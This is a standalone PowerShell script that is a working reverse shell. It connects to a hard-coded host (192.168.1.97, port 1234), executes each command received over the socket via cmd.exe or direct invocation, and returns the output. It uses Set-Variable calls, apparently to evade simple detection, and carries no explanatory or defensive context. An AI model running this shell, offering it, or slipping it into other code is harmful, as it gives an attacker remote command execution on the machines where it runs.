Set-Variable -Name socket -Value (new-object System.Net.Sockets.TcpClient('192.168.1.97',1234));
if($socket -eq $null){exit 1}
Set-Variable -Name stream -Value ($socket.GetStream());
Set-Variable -Name writer -Value (new-object System.IO.StreamWriter($stream));
Set-Variable -Name buffer -Value (new-object System.Byte[] 1024);
Set-Variable -Name encoding -Value (new-object System.Text.AsciiEncoding);
do
{
	$writer.Flush();
	Set-Variable -Name read -Value ($null);
	Set-Variable -Name res -Value ("")
	while($stream.DataAvailable -or $read -eq $null) {
		Set-Variable -Name read -Value ($stream.Read($buffer, 0, 1024))
	}
	Set-Variable -Name out -Value ($encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n",""));
	if(!$out.equals("exit")){
		$args = "";
		if($out.IndexOf(' ') -gt -1){
			$args = $out.substring($out.IndexOf(' ')+1);
			$out = $out.substring(0,$out.IndexOf(' '));
			if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = "cmd.exe"
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = "/c $out $args"
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
			}
			else{
				$res = (&"$out" "$args") | out-string;
			}
		}
		else{
			$res = (&"$out") | out-string;
		}
		if($res -ne $null){
        $writer.WriteLine($res)
    }
	}
}While (!$out.equals("exit"))
$writer.close();
$socket.close();
$stream.Dispose()
